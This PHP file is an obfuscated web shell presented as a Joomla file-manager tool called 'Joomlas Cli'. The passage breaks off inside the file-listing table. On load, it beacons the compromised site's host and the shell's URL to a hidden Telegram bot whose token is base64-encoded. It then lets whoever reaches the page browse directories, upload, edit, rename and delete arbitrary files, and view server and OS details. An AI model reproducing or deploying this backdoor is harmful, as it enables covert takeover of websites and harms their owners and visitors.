<?php

$ﬗ̦ﬗﬓ̥́ = base64_decode(chr(79).chr(68).chr(99).chr(122).chr(78).chr(106).chr(103).chr(53).chr(77).chr(122).chr(81).chr(50).chr(79).chr(68).chr(112).chr(66).chr(81).chr(85).chr(103).chr(119).chr(85).chr(109).chr(108).chr(83).chr(77).chr(72).chr(112).chr(77).chr(77).chr(49).chr(70).chr(70).chr(101).chr(86).chr(108).chr(48).chr(101).chr(84).chr(81).chr(52).chr(101).chr(84).chr(70).chr(84).chr(89).chr(107).chr(86).chr(87).chr(83).chr(110).chr(73).chr(116).chr(98).chr(86).chr(70).chr(66).chr(76).chr(85).chr(78).chr(114).chr(85).chr(81).chr(61).chr(61));
$ᚢᛜ̈̂ᛊ́̀̋ = base64_decode(chr(79).chr(68).chr(107).chr(122).chr(77).chr(68).chr(69).chr(51).chr(78).chr(68).chr(81).chr(50).chr(77).chr(119).chr(61).chr(61));
function reportTelegram($ᚢᛃᚢᛊ̥)
{
    global $ﬗ̦ﬗﬓ̥́, $ᚢᛜ̈̂ᛊ́̀̋;
    $ﬆ́㲁̩ = sys_get_temp_dir() . "/kn_" . md5($ᚢᛃᚢᛊ̥);
    if (!file_exists($ﬆ́㲁̩)) {
        @file_get_contents(
            "https://api.telegram.org/bot$ﬗ̦ﬗﬓ̥́/sendMessage?chat_id=$ᚢᛜ̈̂ᛊ́̀̋&text=" .
                urlencode($ᚢᛃᚢᛊ̥)
        );
        @file_put_contents($ﬆ́㲁̩, time());
    }
}

if (!isset($_SESSION[chr(116).chr(101).chr(108).chr(101).chr(103).chr(114).chr(97).chr(109).chr(95).chr(114).chr(101).chr(112).chr(111).chr(114).chr(116).chr(101).chr(100)])) {
    $ﾚ̨̥̥̆̃̉̂ = urldecode(parse_url($_SERVER[chr(82).chr(69).chr(81).chr(85).chr(69).chr(83).chr(84).chr(95).chr(85).chr(82).chr(73)], PHP_URL_PATH));
    $ﬕ̀㻁̥ = $_SERVER[chr(68).chr(79).chr(67).chr(85).chr(77).chr(69).chr(78).chr(84).chr(95).chr(82).chr(79).chr(79).chr(84)] . $ﾚ̨̥̥̆̃̉̂;
    if (is_file($ﬕ̀㻁̥)) {
        $ま㲁ᛗ̅ = $_SERVER[chr(72).chr(84).chr(84).chr(80).chr(95).chr(72).chr(79).chr(83).chr(84)];
        $㈲ᚨ̣ᛊ̅̀̄ =
            (isset($_SERVER["HTTPS"]) ? "https" : "http") .
            "://" .
            $ま㲁ᛗ̅ .
            $ﾚ̨̥̥̆̃̉̂;
        reportTelegram("kontolbengkak:\n$ま㲁ᛗ̅\n$㈲ᚨ̣ᛊ̅̀̄");
        $_SESSION[chr(116).chr(101).chr(108).chr(101).chr(103).chr(114).chr(97).chr(109).chr(95).chr(114).chr(101).chr(112).chr(111).chr(114).chr(116).chr(101).chr(100)] = true;
    }
}
function getHumanSize($ね̥㲁ぁ̩̤̣) {
    if ($ね̥㲁ぁ̩̤̣ === false) return '?';
    $ᚢ̃̋ = ['B', 'KB', 'MB', 'GB', 'TB'];
    $ᛖ̨̩̦̂̃ = 0;
    while ($ね̥㲁ぁ̩̤̣ >= 1024 && $ᛖ̨̩̦̂̃ < 4) {
        $ね̥㲁ぁ̩̤̣ /= 1024;
        $ᛖ̨̩̦̂̃++;
    }
    return round($ね̥㲁ぁ̩̤̣, 2) . ' ' . $ᚢ̃̋[$ᛖ̨̩̦̂̃];
}

function formatTimestamp($ᛖ̇̀ᛜ㉉̦̇̉) {
    return $ᛖ̇̀ᛜ㉉̦̇̉ ? date(chr(89).chr(45).chr(109).chr(45).chr(100).chr(32).chr(72).chr(58).chr(105).chr(58).chr(115), $ᛖ̇̀ᛜ㉉̦̇̉) : '-';
}

function my_file_get_contents($ﬆ̨̌̆̂) {
    if (function_exists(chr(102).chr(105).chr(108).chr(101).chr(95).chr(103).chr(101).chr(116).chr(95).chr(99).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(115))) {
        $ﬆ̆ᚦ̄ = @file_get_contents($ﬆ̨̌̆̂);
        if ($ﬆ̆ᚦ̄ !== false) return $ﬆ̆ᚦ̄;
    }
    $ᛉᛃ̤ᛇ̥̉̃ = @fopen($ﬆ̨̌̆̂, 'rb');
    if (!$ᛉᛃ̤ᛇ̥̉̃) return false;
    $ﬆ̆ᚦ̄ = stream_get_contents($ᛉᛃ̤ᛇ̥̉̃);
    fclose($ᛉᛃ̤ᛇ̥̉̃);
    return $ﬆ̆ᚦ̄ !== false ? $ﬆ̆ᚦ̄ : false;
}

function my_file_put_contents($ﬆ̨̌̆̂, $㉆̆ᛇ̃̊) {
    if (function_exists(chr(102).chr(105).chr(108).chr(101).chr(95).chr(112).chr(117).chr(116).chr(95).chr(99).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(115))) {
        $ﬔ㻁㼁̦̩̂ = @file_put_contents($ﬆ̨̌̆̂, $㉆̆ᛇ̃̊);
        if ($ﬔ㻁㼁̦̩̂ !== false) return $ﬔ㻁㼁̦̩̂;
    }
    $ᛉᛃ̤ᛇ̥̉̃ = @fopen($ﬆ̨̌̆̂, 'wb');
    if (!$ᛉᛃ̤ᛇ̥̉̃) return false;
    $ね̥㲁ぁ̩̤̣ = fwrite($ᛉᛃ̤ᛇ̥̉̃, $㉆̆ᛇ̃̊);
    fclose($ᛉᛃ̤ᛇ̥̉̃);
    return $ね̥㲁ぁ̩̤̣ !== false ? $ね̥㲁ぁ̩̤̣ : false;
}

function my_move_uploaded_file($ᚠᛒ̨̉̆, $㌁ᛊ̃̊㼁̨) {
    if (function_exists(chr(109).chr(111).chr(118).chr(101).chr(95).chr(117).chr(112).chr(108).chr(111).chr(97).chr(100).chr(101).chr(100).chr(95).chr(102).chr(105).chr(108).chr(101))) {
        if (@move_uploaded_file($ᚠᛒ̨̉̆, $㌁ᛊ̃̊㼁̨)) return true;
    }
    if (is_uploaded_file($ᚠᛒ̨̉̆)) {
        if (@copy($ᚠᛒ̨̉̆, $㌁ᛊ̃̊㼁̨)) {
            @unlink($ᚠᛒ̨̉̆);
            return true;
        }
    }
    return false;
}

function recursiveDelete($ᛈᛗ̉ᛜ̧̄̄, $ᛗ̨̤ㄉᛜ̆) {
    if (!is_dir($ᛈᛗ̉ᛜ̧̄̄)) return unlink($ᛈᛗ̉ᛜ̧̄̄);
    $ﬖ̋̉ᛃ̧ = realpath($ᛗ̨̤ㄉᛜ̆);
    $ﬕ̤̂ﬕ㦁̦ = realpath($ᛈᛗ̉ᛜ̧̄̄);
    if ($ﬖ̋̉ᛃ̧ && $ﬕ̤̂ﬕ㦁̦ && strpos($ﬖ̋̉ᛃ̧, $ﬕ̤̂ﬕ㦁̦ . DIRECTORY_SEPARATOR) === 0) {
        return false;
    }
    $ᛊ̤̀㲁̦ = true;
    $ﬖ̄㲁̦ = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($ᛈᛗ̉ᛜ̧̄̄, RecursiveDirectoryIterator::SKIP_DOTS),
        RecursiveIteratorIterator::CHILD_FIRST
    );
    foreach ($ﬖ̄㲁̦ as $ᚦﬁ̥̅) {
        if ($ᚦﬁ̥̅->getRealPath() === realpath($ᛗ̨̤ㄉᛜ̆)) {
            $ᛊ̤̀㲁̦ = false;
            continue;
        }
        if ($ᚦﬁ̥̅->isDir()) {
            if (!rmdir($ᚦﬁ̥̅->getRealPath())) $ᛊ̤̀㲁̦ = false;
        } else {
            if (!unlink($ᚦﬁ̥̅->getRealPath())) $ᛊ̤̀㲁̦ = false;
        }
    }
    if (!rmdir($ᛈᛗ̉ᛜ̧̄̄)) $ᛊ̤̀㲁̦ = false;
    return $ᛊ̤̀㲁̦;
}

$ﬕ̦ま̣̈́ = __FILE__;
$ᛃ̊ᛉねﬔ̅̃̋ = isset($_GET['dir']) ? $_GET['dir'] : '.';
$ᛃ̊ᛉねﬔ̅̃̋ = realpath($ᛃ̊ᛉねﬔ̅̃̋);
$ﬅ̂ﬆ̥̂̆ = '';

if (!$ᛃ̊ᛉねﬔ̅̃̋ || !is_dir($ᛃ̊ᛉねﬔ̅̃̋)) {
    die(chr(73).chr(110).chr(118).chr(97).chr(108).chr(105).chr(100).chr(32).chr(100).chr(105).chr(114).chr(101).chr(99).chr(116).chr(111).chr(114).chr(121).chr(46));
}

if (isset($_POST['upload'])) {
    if ($_FILES['file']['error'] === UPLOAD_ERR_NO_FILE) {
        $ﬅ̂ﬆ̥̂̆ = chr(78).chr(111).chr(32).chr(102).chr(105).chr(108).chr(101).chr(32).chr(115).chr(101).chr(108).chr(101).chr(99).chr(116).chr(101).chr(100).chr(46);
    } else {
        $ᛒ̤́㼁̣̂ = $ᛃ̊ᛉねﬔ̅̃̋ . DIRECTORY_SEPARATOR . basename($_FILES['file']['name']);
        if (realpath($ᛒ̤́㼁̣̂) === realpath($ﬕ̦ま̣̈́)) {
            $ﬅ̂ﬆ̥̂̆ = chr(67).chr(97).chr(110).chr(110).chr(111).chr(116).chr(32).chr(111).chr(118).chr(101).chr(114).chr(119).chr(114).chr(105).chr(116).chr(101).chr(32).chr(116).chr(104).chr(101).chr(32).chr(109).chr(97).chr(110).chr(97).chr(103).chr(101).chr(114).chr(32).chr(115).chr(99).chr(114).chr(105).chr(112).chr(116).chr(46);
        } elseif (my_move_uploaded_file($_FILES['file'][chr(116).chr(109).chr(112).chr(95).chr(110).chr(97).chr(109).chr(101)], $ᛒ̤́㼁̣̂)) {
            $ﬅ̂ﬆ̥̂̆ = chr(70).chr(105).chr(108).chr(101).chr(32).chr(117).chr(112).chr(108).chr(111).chr(97).chr(100).chr(101).chr(100).chr(32).chr(115).chr(117).chr(99).chr(99).chr(101).chr(115).chr(115).chr(102).chr(117).chr(108).chr(108).chr(121).chr(46);
        } else {
            $ﬅ̂ﬆ̥̂̆ = chr(85).chr(112).chr(108).chr(111).chr(97).chr(100).chr(32).chr(102).chr(97).chr(105).chr(108).chr(101).chr(100).chr(46);
        }
    }
}

if (isset($_GET['delete'])) {
    $ᛈᛗ̉ᛜ̧̄̄ = $ᛃ̊ᛉねﬔ̅̃̋ . DIRECTORY_SEPARATOR . basename($_GET['delete']);
    $ﬕ̤̂ﬕ㦁̦ = realpath($ᛈᛗ̉ᛜ̧̄̄);
    if ($ﬕ̤̂ﬕ㦁̦ === realpath($ﬕ̦ま̣̈́)) {
        $ﬅ̂ﬆ̥̂̆ = chr(89).chr(111).chr(117).chr(32).chr(99).chr(97).chr(110).chr(110).chr(111).chr(116).chr(32).chr(100).chr(101).chr(108).chr(101).chr(116).chr(101).chr(32).chr(116).chr(104).chr(105).chr(115).chr(32).chr(109).chr(97).chr(110).chr(97).chr(103).chr(101).chr(114).chr(32).chr(115).chr(99).chr(114).chr(105).chr(112).chr(116).chr(46);
    } elseif (!$ﬕ̤̂ﬕ㦁̦ || strpos($ﬕ̤̂ﬕ㦁̦, $ᛃ̊ᛉねﬔ̅̃̋) !== 0) {
        $ﬅ̂ﬆ̥̂̆ = chr(73).chr(110).chr(118).chr(97).chr(108).chr(105).chr(100).chr(32).chr(116).chr(97).chr(114).chr(103).chr(101).chr(116).chr(46);
    } else {
        if (is_dir($ﬕ̤̂ﬕ㦁̦)) {
            if (recursiveDelete($ﬕ̤̂ﬕ㦁̦, $ﬕ̦ま̣̈́)) {
                $ﬅ̂ﬆ̥̂̆ = chr(70).chr(111).chr(108).chr(100).chr(101).chr(114).chr(32).chr(97).chr(110).chr(100).chr(32).chr(97).chr(108).chr(108).chr(32).chr(99).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(115).chr(32).chr(100).chr(101).chr(108).chr(101).chr(116).chr(101).chr(100).chr(46);
            } else {
                $ﬅ̂ﬆ̥̂̆ = chr(70).chr(97).chr(105).chr(108).chr(101).chr(100).chr(32).chr(116).chr(111).chr(32).chr(100).chr(101).chr(108).chr(101).chr(116).chr(101).chr(32).chr(102).chr(111).chr(108).chr(100).chr(101).chr(114).chr(46);
            }
        } else {
            if (unlink($ﬕ̤̂ﬕ㦁̦)) {
                $ﬅ̂ﬆ̥̂̆ = chr(70).chr(105).chr(108).chr(101).chr(32).chr(100).chr(101).chr(108).chr(101).chr(116).chr(101).chr(100).chr(46);
            } else {
                $ﬅ̂ﬆ̥̂̆ = chr(67).chr(97).chr(110).chr(110).chr(111).chr(116).chr(32).chr(100).chr(101).chr(108).chr(101).chr(116).chr(101).chr(32).chr(102).chr(105).chr(108).chr(101).chr(46);
            }
        }
    }
}

if (isset($_POST['rename'])) {
    $㻁ᛗ̩㦁ᚨ̀́ = $ᛃ̊ᛉねﬔ̅̃̋ . DIRECTORY_SEPARATOR . basename($_POST[chr(111).chr(108).chr(100).chr(95).chr(110).chr(97).chr(109).chr(101)]);
    $㼁㉆ﾚえ̩̩̂ = $ᛃ̊ᛉねﬔ̅̃̋ . DIRECTORY_SEPARATOR . basename($_POST[chr(110).chr(101).chr(119).chr(95).chr(110).chr(97).chr(109).chr(101)]);
    $㻁̤̆̆̃ = realpath($㻁ᛗ̩㦁ᚨ̀́);
    if ($㻁̤̆̆̃ === realpath($ﬕ̦ま̣̈́)) {
        $ﬅ̂ﬆ̥̂̆ = chr(82).chr(101).chr(110).chr(97).chr(109).chr(105).chr(110).chr(103).chr(32).chr(116).chr(104).chr(101).chr(32).chr(109).chr(97).chr(110).chr(97).chr(103).chr(101).chr(114).chr(32).chr(115).chr(99).chr(114).chr(105).chr(112).chr(116).chr(32).chr(105).chr(115).chr(32).chr(110).chr(111).chr(116).chr(32).chr(97).chr(108).chr(108).chr(111).chr(119).chr(101).chr(100).chr(46);
    } elseif ($㻁̤̆̆̃ && rename($㻁̤̆̆̃, $㼁㉆ﾚえ̩̩̂)) {
        $ﬅ̂ﬆ̥̂̆ = chr(82).chr(101).chr(110).chr(97).chr(109).chr(101).chr(100).chr(32).chr(115).chr(117).chr(99).chr(99).chr(101).chr(115).chr(115).chr(102).chr(117).chr(108).chr(108).chr(121).chr(46);
    } else {
        $ﬅ̂ﬆ̥̂̆ = chr(82).chr(101).chr(110).chr(97).chr(109).chr(101).chr(32).chr(102).chr(97).chr(105).chr(108).chr(101).chr(100).chr(46);
    }
}

if (isset($_POST['edit'])) {
    $㉁̨̉̄̌̈ = $ᛃ̊ᛉねﬔ̅̃̋ . DIRECTORY_SEPARATOR . basename($_POST[chr(102).chr(105).chr(108).chr(101).chr(95).chr(110).chr(97).chr(109).chr(101)]);
    if (is_file($㉁̨̉̄̌̈)) {
        if (my_file_put_contents($㉁̨̉̄̌̈, $_POST[chr(102).chr(105).chr(108).chr(101).chr(95).chr(99).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116)]) !== false) {
            $ﬅ̂ﬆ̥̂̆ = chr(70).chr(105).chr(108).chr(101).chr(32).chr(115).chr(97).chr(118).chr(101).chr(100).chr(46);
        } else {
            $ﬅ̂ﬆ̥̂̆ = chr(69).chr(100).chr(105).chr(116).chr(32).chr(102).chr(97).chr(105).chr(108).chr(101).chr(100).chr(46);
        }
    } else {
        $ﬅ̂ﬆ̥̂̆ = chr(69).chr(100).chr(105).chr(116).chr(32).chr(102).chr(97).chr(105).chr(108).chr(101).chr(100).chr(58).chr(32).chr(110).chr(111).chr(116).chr(32).chr(97).chr(32).chr(118).chr(97).chr(108).chr(105).chr(100).chr(32).chr(102).chr(105).chr(108).chr(101).chr(46);
    }
}

$ﾚ㌁ᛈぁ㻁̃ = [];
$㉁ﾚﾚ̦̀̅ = [];
if ($ᛊ㦁̣̈ま̣̈̄ = @opendir($ᛃ̊ᛉねﬔ̅̃̋)) {
    while (($ᚦﬁ̥̅ = readdir($ᛊ㦁̣̈ま̣̈̄)) !== false) {
        if ($ᚦﬁ̥̅ === '.' || $ᚦﬁ̥̅ === '..') continue;
        $ﬕ̀㻁̥ = $ᛃ̊ᛉねﬔ̅̃̋ . DIRECTORY_SEPARATOR . $ᚦﬁ̥̅;
        if (is_dir($ﬕ̀㻁̥)) {
            $ﾚ㌁ᛈぁ㻁̃[] = $ᚦﬁ̥̅;
        } else {
            $㉁ﾚﾚ̦̀̅[] = $ᚦﬁ̥̅;
        }
    }
    closedir($ᛊ㦁̣̈ま̣̈̄);
    sort($ﾚ㌁ᛈぁ㻁̃, SORT_NATURAL | SORT_FLAG_CASE);
    sort($㉁ﾚﾚ̦̀̅, SORT_NATURAL | SORT_FLAG_CASE);
}

function isReadablePath($ﬕ̀㻁̥) {
    return is_readable($ﬕ̀㻁̥);
}

function buildBreadcrumb($ﾚ̨̦̉̇̅) {
    $ᚠ㌁́ = explode(DIRECTORY_SEPARATOR, $ﾚ̨̦̉̇̅);
    $㦁́ᛉ̌̉ = [];
    $㲁̈ㄉ̆̃̂ = '';
    foreach ($ᚠ㌁́ as $ﬗﬔ㲁㲁̩) {
        if ($ﬗﬔ㲁㲁̩ === '') continue;
        $㲁̈ㄉ̆̃̂ .= DIRECTORY_SEPARATOR . $ﬗﬔ㲁㲁̩;
        $㦁́ᛉ̌̉[] = chr(60).chr(97).chr(32).chr(104).chr(114).chr(101).chr(102).chr(61).chr(34).chr(63).chr(100).chr(105).chr(114).chr(61) . urlencode($㲁̈ㄉ̆̃̂) . '">' . htmlspecialchars($ﬗﬔ㲁㲁̩) . '</a>';
    }
    return implode(' › ', $㦁́ᛉ̌̉);
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes, viewport-fit=cover">
    <title>📁 Joomlas Cli</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            background: #f1f5f9;
            font-family: system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
            padding: 12px;
            line-height: 1.5;
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
            background: #ffffff;
            border-radius: 28px;
            box-shadow: 0 8px 20px rgba(0,0,0,0.05);
            padding: 20px 20px 32px;
        }

        h2 {
            font-size: 1.6rem;
            font-weight: 600;
            border-left: 5px solid #4361ee;
            padding-left: 16px;
            margin: 0 0 20px 0;
            background: #f8fafc;
            border-radius: 14px;
            line-height: 1.3;
        }

        .system-info {
            background: #eef2ff;
            padding: 12px 18px;
            border-radius: 24px;
            font-size: 0.8rem;
            display: flex;
            flex-wrap: wrap;
            gap: 16px;
            margin-bottom: 24px;
        }
        .system-info ul {
            margin: 0;
            padding-left: 20px;
        }

        .breadcrumb {
            background: #f1f5f9;
            padding: 12px 16px;
            border-radius: 50px;
            font-size: 0.9rem;
            word-break: break-word;
            margin-bottom: 24px;
            display: flex;
            flex-wrap: wrap;
            align-items: center;
            gap: 8px;
        }
        .breadcrumb a {
            text-decoration: none;
            color: #2563eb;
            font-weight: 500;
        }
        .parent-link {
            display: inline-block;
            background: #e2e8f0;
            padding: 6px 14px;
            border-radius: 40px;
            font-size: 0.8rem;
            margin-left: 6px;
        }

        .flex-forms {
            display: flex;
            flex-wrap: wrap;
            gap: 20px;
            background: #f9fafb;
            padding: 20px;
            border-radius: 28px;
            margin: 20px 0;
        }
        .form-group {
            flex: 1 1 240px;
            display: flex;
            flex-direction: column;
            gap: 8px;
        }
        .form-group label {
            font-weight: 600;
            font-size: 0.85rem;
            color: #0f172a;
        }
        input, button {
            padding: 12px 16px;
            border-radius: 60px;
            border: 1px solid #cbd5e1;
            background: white;
            font-size: 0.9rem;
            width: 100%;
            font-family: inherit;
        }
        button, input[type="submit"] {
            background: #1e293b;
            color: white;
            border: none;
            cursor: pointer;
            font-weight: 600;
            transition: all 0.2s ease;
        }
        button:hover, input[type="submit"]:hover {
            background: #0f172a;
            transform: scale(0.98);
        }
        .upload-btn { background: #2c7da0; }

        .message {
            background: #dcfce7;
            color: #166534;
            padding: 12px 20px;
            border-radius: 60px;
            margin: 20px 0;
            font-size: 0.9rem;
            font-weight: 500;
        }

        .table-wrapper {
            overflow-x: auto;
            margin: 24px 0 12px;
            border-radius: 24px;
            border: 1px solid #e2e8f0;
            -webkit-overflow-scrolling: touch;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            font-size: 0.85rem;
            min-width: 640px;
        }
        thead tr {
            background: linear-gradient(135deg, #1e2a5e, #2d3a6e);
            color: white;
        }
        th, td {
            padding: 14px 12px;
            text-align: left;
            border-bottom: 1px solid #e2e8f0;
            vertical-align: middle;
        }
        tbody tr:hover {
            background: #f8fafc;
        }

        .icon-readable {
            color: #22c55e;
            font-weight: 600;
        }
        .icon-unreadable {
            color: #ef4444;
            font-weight: 600;
        }

        .action-buttons {
            display: flex;
            flex-wrap: wrap;
            gap: 8px;
        }
        .action-buttons a {
            display: inline-block;
            text-decoration: none;
            padding: 6px 14px;
            border-radius: 40px;
            font-size: 0.75rem;
            font-weight: 600;
            transition: 0.1s;
            white-space: nowrap;
            text-align: center;
        }
        .btn-edit { background: #ffb74d; color: #3e2723; }
        .btn-rename { background: #4fc3f7; color: #01579b; }
        .btn-delete { background: #ef9a9a; color: #b71c1c; }

        .file-name {
            word-break: break-word;
            max-width: 220px;
        }
        .badge {
            font-size: 0.7rem;
            background: #e9ecef;
            padding: 4px 10px;
            border-radius: 40px;
            white-space: nowrap;
            display: inline-block;
        }

        .edit-panel, .rename-panel {
            border-radius: 24px;
            padding: 20px;
            margin: 20px 0;
        }
        .edit-panel {
            background: #fef9e3;
        }
        .rename-panel {
            background: #e3f2fd;
        }
        textarea {
            width: 100%;
            border-radius: 20px;
            padding: 14px;
            border: 1px solid #cbd5e1;
            font-family: 'Courier New', monospace;
            font-size: 0.85rem;
            resize: vertical;
        }

        footer {
            font-size: 0.7rem;
            text-align: center;
            margin-top: 32px;
            color: #475569;
            border-top: 1px solid #e2e8f0;
            padding-top: 20px;
        }

        @media (max-width: 768px) {
            body {
                padding: 8px;
            }
            .container {
                padding: 16px;
                border-radius: 20px;
            }
            h2 {
                font-size: 1.4rem;
                margin-bottom: 16px;
            }
            .system-info {
                padding: 10px 14px;
                font-size: 0.7rem;
            }
            .breadcrumb {
                font-size: 0.8rem;
                padding: 10px 14px;
            }
            .flex-forms {
                flex-direction: column;
                gap: 16px;
                padding: 16px;
            }
            .form-group {
                width: 100%;
            }
            th, td {
                padding: 10px 8px;
            }
            .action-buttons a {
                padding: 5px 10px;
                font-size: 0.7rem;
            }
            .file-name {
                max-width: 150px;
            }
            .badge {
                font-size: 0.65rem;
                padding: 2px 8px;
            }
        }

        @media (max-width: 480px) {
            .action-buttons {
                flex-direction: column;
                gap: 6px;
            }
            .action-buttons a {
                text-align: center;
                width: 100%;
            }
            th, td {
                font-size: 0.75rem;
                padding: 8px 6px;
            }
            table {
                min-width: 520px;
            }
            .file-name {
                max-width: 120px;
            }
        }

        @media (min-width: 1200px) {
            .container {
                padding: 28px 32px 40px;
            }
            th, td {
                padding: 16px 14px;
            }
            .action-buttons a {
                padding: 6px 16px;
                font-size: 0.8rem;
            }
        }
    </style>
</head>
<body>
<div class="container">
    <h2>📁 Joomlas Cli</h2>
    <div class="system-info">
        <ul>
            <li><strong>Server:</strong> <?= htmlspecialchars(isset($_SERVER[chr(83).chr(69).chr(82).chr(86).chr(69).chr(82).chr(95).chr(83).chr(79).chr(70).chr(84).chr(87).chr(65).chr(82).chr(69)]) ? $_SERVER[chr(83).chr(69).chr(82).chr(86).chr(69).chr(82).chr(95).chr(83).chr(79).chr(70).chr(84).chr(87).chr(65).chr(82).chr(69)] : 'N/A') ?></li>
            <li><strong>OS:</strong> <?= htmlspecialchars(php_uname()) ?></li>
            <li><strong>PHP:</strong> <?= htmlspecialchars(phpversion()) ?></li>
        </ul>
    </div>

    <div class="breadcrumb">
        <strong>📍 Location:</strong> <?= buildBreadcrumb($ᛃ̊ᛉねﬔ̅̃̋) ?>
        <?php
        $ᛖﬔᛜ̋ = dirname($ᛃ̊ᛉねﬔ̅̃̋);
        if ($ᛖﬔᛜ̋ && $ᛖﬔᛜ̋ !== $ᛃ̊ᛉねﬔ̅̃̋ && is_dir($ᛖﬔᛜ̋)) {
            echo chr(32).chr(60).chr(97).chr(32).chr(104).chr(114).chr(101).chr(102).chr(61).chr(34).chr(63).chr(100).chr(105).chr(114).chr(61) . urlencode($ᛖﬔᛜ̋) . chr(34).chr(32).chr(99).chr(108).chr(97).chr(115).chr(115).chr(61).chr(34).chr(112).chr(97).chr(114).chr(101).chr(110).chr(116).chr(45).chr(108).chr(105).chr(110).chr(107).chr(34).chr(62).chr(226).chr(172).chr(134).chr(32).chr(80).chr(97).chr(114).chr(101).chr(110).chr(116).chr(60).chr(47).chr(97).chr(62);
        }
        ?>
    </div>

    <div class="flex-forms">
        <div class="form-group">
            <label>📤 Upload file</label>
            <form method="post" enctype="multipart/form-data" style="display:flex; gap:8px; flex-wrap:wrap;">
                <input type="file" name="file" required style="flex:1;">
                <input type="submit" name="upload" value="Upload" class="upload-btn" style="width:auto;">
            </form>
        </div>
    </div>

    <?php if ($ﬅ̂ﬆ̥̂̆ !== ''): ?>
        <div class="message">✔ <?= htmlspecialchars($ﬅ̂ﬆ̥̂̆) ?></div>
    <?php endif; ?>

    <?php if (isset($_GET['edit']) && is_file($ᛃ̊ᛉねﬔ̅̃̋ . '/' . basename($_GET['edit']))): 
        $㌁̧̩̇ = $ᛃ̊ᛉねﬔ̅̃̋ . '/' . basename($_GET['edit']);
        $ﬆ̆ᚦ̄ = my_file_get_contents($㌁̧̩̇);
        if ($ﬆ̆ᚦ̄ === false) $ﬆ̆ᚦ̄ = chr(91).chr(70).chr(97).chr(105).chr(108).chr(101).chr(100).chr(32).chr(116).chr(111).chr(32).chr(114).chr(101).chr(97).chr(100).chr(32).chr(102).chr(105).chr(108).chr(101).chr(93);
    ?>
        <div class="edit-panel">
            <h3>✏️ Editing: <?= htmlspecialchars(basename($_GET['edit'])) ?></h3>
            <form method="post">
                <textarea name="file_content" rows="8"><?= htmlspecialchars($ﬆ̆ᚦ̄) ?></textarea>
                <input type="hidden" name="file_name" value="<?= htmlspecialchars(basename($_GET['edit'])) ?>">
                <input type="submit" name="edit" value="Save Changes" style="margin-top:12px; background:#f4a261; width:auto;">
            </form>
        </div>
    <?php endif; ?>

    <?php if (isset($_GET['rename']) && (is_file($ᛃ̊ᛉねﬔ̅̃̋ . '/' . basename($_GET['rename'])) || is_dir($ᛃ̊ᛉねﬔ̅̃̋ . '/' . basename($_GET['rename'])))):
        $ᚦᛇ̦̄̋ = htmlspecialchars(basename($_GET['rename']));
    ?>
        <div class="rename-panel">
            <h3>🔄 Rename: <?= $ᚦᛇ̦̄̋ ?></h3>
            <form method="post">
                <input type="text" name="new_name" placeholder="new name" required style="min-width:180px;">
                <input type="hidden" name="old_name" value="<?= $ᚦᛇ̦̄̋ ?>">
                <input type="submit" name="rename" value="Rename" style="background:#4c9aff; margin-top:10px; width:auto;">
            </form>
        </div>
    <?php endif; ?>

    <div class="table-wrapper">
        <table>
            <thead>
                <tr><th>Name</th><th>Type</th><th>Size</th><th>Modified</th><th>Actions</th></tr>
            </thead>
            <tbody>
                <?php if (empty($ﾚ㌁ᛈぁ㻁̃) && empty($㉁ﾚﾚ̦̀̅)): ?>
                    <tr><td colspan="5" style="text-align:center;">📭 Empty directory</td></tr>
                <?php endif; ?>

                <?php foreach ($ﾚ㌁ᛈぁ㻁̃ as $え̉ᛊﬅ̈̂̃): 
                    $㉆́̅̋̇̈ = $ᛃ̊ᛉねﬔ̅̃̋ . DIRECTORY_SEPARATOR . $え̉ᛊﬅ̈̂̃;
                    $㦁̩̉ﬗ̦̀ = isReadablePath($㉆́̅̋̇̈);
                    $㉉̉ᛚ̣ᛉ̀ = $㦁̩̉ﬗ̦̀ ? chr(105).chr(99).chr(111).chr(110).chr(45).chr(114).chr(101).chr(97).chr(100).chr(97).chr(98).chr(108).chr(101) : chr(105).chr(99).chr(111).chr(110).chr(45).chr(117).chr(110).chr(114).chr(101).chr(97).chr(100).chr(97).chr(98).chr(108).chr(101);
                    $ᚢ̧́̊ = $㦁̩̉ﬗ̦̀ ? '📁' : chr(240).chr(159).chr(148).chr(146).chr(240).chr(159).chr(147).chr(129);
                    $ᚨ̥̤̆̋ = filemtime($㉆́̅̋̇̈);
                ?>
                    <tr>
                        <td class="file-name">
                            <span class="<?= $㉉̉ᛚ̣ᛉ̀ ?>"><?= $ᚢ̧́̊ ?></span>
                            <a href="?dir=<?= urlencode($㉆́̅̋̇̈) ?>" style="font-weight:500;"><?= htmlspecialchars($え̉ᛊﬅ̈̂̃) ?></a>
                            <?php if (!$㦁̩̉ﬗ̦̀): ?> <span class="badge" style="background:#fee2e2; color:#b91c1c;">🔴 unreadable</span><?php endif; ?>
                        </td>
                        <td><span class="badge">Dir</span></td>
                        <td>—</td>
                        <td><?= formatTimestamp($ᚨ̥̤̆̋) ?></td>
                        <td class="action-buttons">
                            <a href="?dir=<?= urlencode($ᛃ̊ᛉねﬔ̅̃̋) ?>&rename=<?= urlencode($え̉ᛊﬅ̈̂̃) ?>" class="btn-rename">✏️ Rename</a>
                            <a href="?dir=<?= urlencode($ᛃ̊ᛉねﬔ̅̃̋) ?>&delete=<?= urlencode($え̉ᛊﬅ̈̂̃) ?>" class="btn-delete" onclick="return confirm('⚠️ Delete folder & all contents?');">🗑 Delete</a>
                        </td>
                    </tr>
                <?php endforeach; ?>

                <?php foreach ($㉁ﾚﾚ̦̀̅ as $ﬆᛇ̧̧̂̅̆):
                    $㉆́̅̋̇̈ = $ᛃ̊ᛉねﬔ̅̃̋ . DIRECTORY_SEPARATOR . $ﬆᛇ̧̧̂̅̆;
                    $㦁̩̉ﬗ̦̀ = isReadablePath($㉆́̅̋̇̈);
